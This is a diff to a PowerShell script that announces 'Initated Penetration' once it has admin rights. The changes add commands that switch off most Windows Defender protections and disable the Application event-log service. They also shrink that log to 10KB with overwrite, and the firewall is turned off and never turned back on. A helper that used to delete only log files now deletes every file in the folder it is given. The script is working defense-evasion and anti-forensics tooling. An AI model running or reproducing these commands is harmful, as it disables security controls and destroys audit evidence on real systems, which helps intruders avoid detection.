@@ -49,7 +49,8 @@ Function removeLogFilesFromAFolder {
 
     if(checkIfFolderExists -Folderpath $FolderPath) {
         Write-Host "Initiaing file deletion on " + $FolderPath
-        Remove-Item $FolderPath + "\*.log"
+        $FolderPathWithFileExtension = $FolderPath + "\*.*"
+        Remove-Item $FolderPathWithFileExtension
         Write-Host "File deleted from " + $FolderPath
     }
 }
@@ -58,21 +59,31 @@ Function removeLogFilesFromAFolder {
 if(checkRunAsAdministrator) {
     Write-Host "Initated Penetration ..."
 
+    # Disabled Windows Defender
+    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true
+
     # Disabled Firewalld
     Set-NetFirewallProfile -Enabled False
 
     #Disabled the EventLog Service
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 0 -Type DWord
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application" -Name "Start" -Value 4 -Type DWord
+
+    # Decreased max size of event log application to 10KB
+    $eventLog = New-Object System.Diagnostics.EventLog("Application")
+    $eventLog.MaximumKilobytes = 10
+    $eventLog.ModifyOverflowPolicy("OverwriteAsNeeded", 0)
+
 
     #Removed all the log files
-    removeLogFilesFromAFolder -Folderpath "C:\Logs"
-    removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
-    removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
-    removeLogFilesFromAFolder -Folderpath "%SystemRoot%\Logs\WindowsUpdate"
+    #removeLogFilesFromAFolder -Folderpath "C:\Logs"
+    #removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
+    #removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
 
     #Enabled Firewalld
-    Set-NetFirewallProfile -Enabled True
+    #Set-NetFirewallProfile -Enabled True
 
     #Enabled the EventLog Service
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 1 -Type DWord
+    #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 1 -Type DWord
+    #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application" -Name "Start" -Value 2 -Type DWord
 }
